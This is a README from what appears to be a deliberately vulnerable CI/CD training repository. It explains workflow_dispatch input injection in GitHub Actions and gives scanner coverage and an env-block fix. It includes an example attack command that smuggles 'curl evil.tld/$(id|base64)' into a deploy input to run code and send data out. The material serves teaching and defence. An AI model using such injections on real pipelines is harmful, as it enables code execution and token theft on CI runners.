# Scenario 13: `workflow_dispatch` input injection

**OWASP CICD-SEC mapping:** CICD-SEC-4 (Poisoned Pipeline Execution)

**Vulnerable workflow:** [`.github/workflows/scenario-13-input-injection-workflow-dispatch.yml`](../../.github/workflows/scenario-13-input-injection-workflow-dispatch.yml)

## The pattern

`workflow_dispatch` inputs come from whoever invoked the workflow — UI
button click, REST API call, or `gh workflow run`. Anyone who can trigger
the workflow controls every `${{ inputs.* }}` value. Interpolating one
directly into a `run:` block makes the trigger an authenticated RCE primitive.

Compared to [Scenario 02](../02-script-injection-issue-title/README.md)
(issue-title injection), the attack surface is narrower — the trigger
requires write or fork-PR-author access in most configurations — but it's
*also more reliable*. The attacker controls both the trigger time and the
payload exactly, no need to phrase the exploit as a plausible issue title.

## How an attacker exploits it

With a PAT (or via a compromised collaborator account):

```bash
gh workflow run scenario-13-input-injection-workflow-dispatch.yml \
  -f target='example.com; curl evil.tld/$(id|base64) #' \
  -f tag=v1.0.0
```

The `target` value is spliced into the `ssh ... deploy@...` line *before*
bash sees it, executing the embedded command on the runner with
`$GITHUB_TOKEN` in environment.

## Expected scanner coverage

| Scanner   | Detection |
|-----------|-----------|
| zizmor    | `template-injection` |
| poutine   | `injection` |
| checkov   | partial |
| kics      | "Run Block Injection" |

## Fix

Route the input through an `env:` block; expand it via bash variable
syntax (which doesn't re-interpret shell metacharacters):

```yaml
- env:
    DEPLOY_TARGET: ${{ inputs.target }}
    DEPLOY_TAG: ${{ inputs.tag }}
  run: ssh -o StrictHostKeyChecking=no "deploy@${DEPLOY_TARGET}" "deploy ${DEPLOY_TAG}"
```

If the input must match a known format (hostname, semver), validate it
with a regex in the same step and fail closed on mismatch.

## References

- GitHub docs — "Security hardening for GitHub Actions":
  https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions
